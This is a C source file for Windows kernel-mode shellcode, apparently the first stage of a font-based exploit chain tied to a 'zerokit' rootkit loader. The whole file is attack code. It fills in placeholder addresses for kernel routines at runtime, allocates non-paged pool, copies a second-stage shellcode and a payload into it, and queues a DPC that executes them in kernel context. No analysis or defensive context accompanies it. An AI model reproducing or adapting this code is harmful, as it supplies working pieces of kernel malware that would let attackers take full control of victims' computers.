#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../../../../../shared_code/types.h"
#include "../../../../../../loader/mod_shared/zerokit.h"

typedef PVOID (*FnExAllocatePoolWithTag)(POOL_TYPE  PoolType, SIZE_T  NumberOfBytes, ULONG  Tag);
typedef VOID (*FnKeInitializeDpc)(PRKDPC  Dpc, PKDEFERRED_ROUTINE  DeferredRoutine, PVOID  DeferredContext);
typedef BOOLEAN (*FnKeInsertQueueDpc)(PRKDPC  Dpc, PVOID  SystemArgument1, PVOID  SystemArgument2);
//typedef void (*FnScLevel1)();

VOID shellcode_ttf_level0()
{
    FnExAllocatePoolWithTag fnExAllocatePoolWithTag;
    FnKeInitializeDpc fnKeInitializeDpc;
    FnKeInsertQueueDpc fnKeInsertQueueDpc;
    uint8_t* scLevel1;
    uint8_t* newScLevel1;
    uint32_t sc1Size;
    uint8_t* pPayload;
    uint8_t* pNewPayload;
    uint32_t payloadSize;
    uint32_t patchOffset;
    PRKDPC pDpc;

// #ifdef _WIN64
//     __debugbreak();
// #else
//     __asm int 3
// #endif // _WIN64

    __stosq((uint64_t*)&fnExAllocatePoolWithTag, 0xAAAAAAAAAAAAAAAAULL, 1);
    __stosq((uint64_t*)&fnKeInitializeDpc,       0xBBBBBBBBBBBBBBBBULL, 1);
    __stosq((uint64_t*)&fnKeInsertQueueDpc,      0xCCCCCCCCCCCCCCCCULL, 1);
    __stosq((uint64_t*)&scLevel1,                0xDDDDDDDDDDDDDDDDULL, 1);
    __stosd((uint32_t*)&sc1Size,                 0xEEEEEEEEUL, 1);
    __stosq((uint64_t*)&pPayload,                0xFEFEFEFEFEFEFEFEULL, 1);
    __stosd((uint32_t*)&payloadSize,             0x79797979UL, 1);
    __stosd((uint32_t*)&patchOffset,             0xABABABABUL, 1);
    
    newScLevel1 = fnExAllocatePoolWithTag(NonPagedPool, sc1Size, 0x97979797);
    pNewPayload = fnExAllocatePoolWithTag(NonPagedPool, payloadSize, 0x97979797);
    pDpc = fnExAllocatePoolWithTag(NonPagedPool, sizeof(KDPC), 0x97979797);
    if (newScLevel1 != NULL && pNewPayload != NULL && pDpc != NULL) {
        __movsb(newScLevel1, scLevel1, sc1Size);
        __movsb(pNewPayload, pPayload, payloadSize);
        __stosq(newScLevel1 + patchOffset, (uint64_t)pNewPayload, 1);
        
        fnKeInitializeDpc(pDpc, (PKDEFERRED_ROUTINE)newScLevel1, NULL);
        fnKeInsertQueueDpc(pDpc, NULL, NULL);        
    }    
}
